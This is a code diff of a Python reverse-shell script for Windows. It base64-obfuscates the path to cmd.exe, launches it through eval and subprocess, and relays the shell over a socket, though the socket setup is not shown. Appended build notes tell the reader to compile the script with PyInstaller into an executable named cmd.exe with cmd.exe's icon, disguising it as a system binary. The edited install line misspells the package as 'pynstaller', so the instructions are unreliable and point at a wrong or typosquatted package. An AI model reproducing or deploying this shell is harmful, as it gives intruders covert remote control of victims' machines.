@@ -68,12 +68,19 @@ if __name__ == "__main__":
     "c:\windows\system32\cmd.exe"
     ImM6XHdpbmRvd3Ncc3lzdGVtMzJcY21kLmV4ZSI=
     """
-    
+
     # From Base64 to Original String
-    cmd_string = str((base64.b64decode('ImM6XHdpbmRvd3Ncc3lzdGVtMzJcY21kLmV4ZSI=').decode('utf-8')))
-    
+    cmd_string = str(
+        (base64.b64decode("ImM6XHdpbmRvd3Ncc3lzdGVtMzJcY21kLmV4ZSI=").decode("utf-8"))
+    )
+
     # Call Process and TCP
-    p = subprocess.Popen([eval(cmd_string)],stdout=subprocess.PIPE,stderr=subprocess.STDOUT,stdin=subprocess.PIPE,)
+    p = subprocess.Popen(
+        [eval(cmd_string)],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT,
+        stdin=subprocess.PIPE,
+    )
     server2process_thread = threading.Thread(target=server2process, args=[s, p])
     server2process_thread.daemon = True
     server2process_thread.start()
@@ -91,15 +98,11 @@ if __name__ == "__main__":
 Python 2 & 3
 
 ---------------
-1) Install "Python3" Windows (Python version 2.7 / 3.4-3.7) *** Review "https://pypi.org/project/PyInstaller/"
+1) Install "Python3" Windows
+2) Install "pyinstaller"
+C:\Python3\Scripts\> pip3.exe install pynstaller
 
-2) Update pip
-C:\Python3> python.exe -m pip install --upgrade pip
-
-3) Install "pyinstaller"
-C:\Python3\Scripts\> pip3.exe install pyinstaller
-
-4) Convert from .py to .exe
-C:\Python3\Scripts\> pyinstaller.exe c:\python_reverse_shell.py --clean --onefile --console --icon=c:\Windows\System32\cmd.exe --name cmd.exe
+Convert from .py to .exe
+C:\Python3\Scripts\> pyinstaller.exe c:\python_reverse_shell.py --clean --onefile --console --icon=c:\Windows\System32\cmd.exe --name c:\tmp\cmd.exe
 
 """
